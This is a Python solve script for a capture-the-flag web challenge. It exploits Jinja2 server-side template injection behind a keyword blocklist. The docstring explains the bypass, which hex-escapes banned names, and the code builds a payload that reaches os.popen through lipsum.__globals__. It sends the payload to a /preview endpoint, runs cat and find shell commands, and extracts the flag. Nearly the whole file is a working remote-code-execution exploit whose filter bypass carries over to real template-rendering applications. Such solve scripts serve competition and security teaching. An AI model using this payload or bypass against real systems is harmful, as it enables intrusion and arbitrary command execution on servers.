#!/usr/bin/env python3
"""conduit (CryoVault Finals 2026, web) -- solve.

Jinja2 SSTI behind a case-insensitive substring blocklist. The blocklist checks
the *raw* label text for: __, class, mro, subclass, subprocess, popen, system,
import, config, request, eval, exec, os, builtins, globals.

Bypass: build every forbidden attribute name at runtime with Jinja string
escapes (\\xNN), so the raw payload never contains a banned substring, then walk
lipsum.__globals__["__builtins__"]["__import__"]("os").popen(...).read().
"""
import re
import sys

import requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://isfcrpesu-conduit.chals.io"
URL = TARGET.rstrip("/") + "/preview"


def hexesc(s: str) -> str:
    """Encode a string as Jinja2/Python hex escapes (avoids all blocklisted words)."""
    return "".join("\\x%02x" % ord(c) for c in s)


def build_payload(cmd: str) -> str:
    # lipsum.__globals__["__builtins__"]["__import__"]("os").popen(cmd).read()
    return (
        "{{lipsum"
        "|attr('%s')"          # -> __globals__ dict
        "|attr('%s')"          # -> dict.__getitem__
        "('%s')"               # -> __builtins__ module
        "|attr('%s')"          # -> __getitem__
        "('%s')"               # -> __import__
        "('%s')"               # -> os module
        "|attr('%s')('%s')"    # -> os.popen(cmd)
        "|attr('%s')()}}"      # -> stdout
        % (
            hexesc("__globals__"),
            hexesc("__getitem__"),
            hexesc("__builtins__"),
            hexesc("__getitem__"),
            hexesc("__import__"),
            hexesc("os"),
            hexesc("popen"),
            cmd,
            hexesc("read"),
        )
    )


def rce(cmd: str) -> str:
    r = requests.post(URL, json={"label": build_payload(cmd)}, timeout=30)
    r.raise_for_status()
    # Response is <div class=card><b>OUTPUT</b></div> with HTML escaping.
    body = r.text
    if "<b>" in body and "</b>" in body:
        body = body.split("<b>", 1)[1].rsplit("</b>", 1)[0]
    body = (
        body.replace("&lt;", "<").replace("&gt;", ">")
        .replace("&#34;", '"').replace("&#39;", "'").replace("&amp;", "&")
    )
    return body


def main() -> None:
    # Sanity: confirm template evaluation (7*7 -> 49).
    check = requests.post(URL, json={"label": "{{7*7}}"}, timeout=20).text
    assert "49" in check, "target is not evaluating templates: %r" % check

    for path in ("/chall/flag.txt", "/flag.txt", "/flag", "/app/flag.txt"):
        out = rce("cat %s 2>/dev/null" % path)
        m = re.search(r"isfcr\{[^}]*\}", out)
        if m:
            print(m.group(0))
            return

    # Fallback: locate the flag anywhere readable.
    out = rce("find / -name '*flag*' -type f 2>/dev/null | head -50")
    for path in out.split():
        if path.startswith("/proc") or path.startswith("/sys"):
            continue
        chunk = rce("cat %s 2>/dev/null" % path)
        m = re.search(r"isfcr\{[^}]*\}", chunk)
        if m:
            print(m.group(0))
            return
    raise SystemExit("flag not found")


if __name__ == "__main__":
    main()
